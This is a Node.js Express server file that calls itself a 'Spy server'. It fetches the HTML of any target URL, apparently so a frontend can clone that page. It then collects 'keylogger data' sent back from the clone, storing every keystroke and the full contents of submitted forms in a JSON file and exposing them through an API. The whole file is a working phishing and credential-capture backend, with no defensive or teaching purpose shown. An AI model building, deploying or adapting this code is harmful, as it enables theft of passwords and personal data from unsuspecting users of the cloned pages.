const express = require('express');
const http = require('http');
const fs = require('fs');
const path = require('path');
const { JSDOM } = require('jsdom'); // For parsing HTML/CSS server-side

const app = express();
app.use(express.json());
app.use(express.static('public')); // Serve index.html

// Store for captured logs
let logs = {
  url: '',
  keystrokes: [],
  submittedData: null,
  timestamp: null
};

// Function to fetch a URL and return the HTML
function fetchURL(url) {
  return new Promise((resolve, reject) => {
    http.get(url, (res) => {
      let data = '';
      res.on('data', (chunk) => { data += chunk; });
      res.on('end', () => resolve(data));
    }).on('error', (err) => reject(err));
  });
}

// API: Extract CSS and HTML structure from a target URL
app.get('/api/extract/:url', async (req, res) => {
  const targetUrl = req.params.url;
  try {
    const html = await fetchURL(targetUrl);
    
    // We return the raw HTML so the frontend can inject it into an iframe or shadow DOM
    // Alternatively, we could parse it here to extract specific <style> tags
    res.json({
      success: true,
      html: html,
      url: targetUrl
    });
  } catch (error) {
    res.status(500).json({ success: false, error: error.message });
  }
});

// API: Receive keylogger data from the frontend
app.post('/api/log', (req, res) => {
  const { url, keystroke, eventType, fieldSelector, fullFormState } = req.body;
  
  if (!logs.url) {
    logs.url = url;
    logs.timestamp = new Date().toISOString();
    logs.keystrokes = [];
  }

  if (eventType === 'keydown') {
    logs.keystrokes.push({
      time: new Date().toISOString(),
      key: keystroke,
      field: fieldSelector
    });
  }

  if (eventType === 'submit' && fullFormState) {
    logs.submittedData = fullFormState;
    console.log("FORM SUBMITTED!", fullFormState);
  }

  // Save to file periodically or on submit
  if (eventType === 'submit') {
    fs.writeFileSync('captured_logs.json', JSON.stringify(logs, null, 2));
    console.log(`Logs saved for ${url}`);
  }

  res.status(200).send({ status: 'ok' });
});

// API: Get current logs
app.get('/api/logs', (req, res) => {
  res.json(logs);
});

const PORT = 3000;
app.listen(PORT, () => console.log(`Spy server running on http://localhost:${PORT}`));
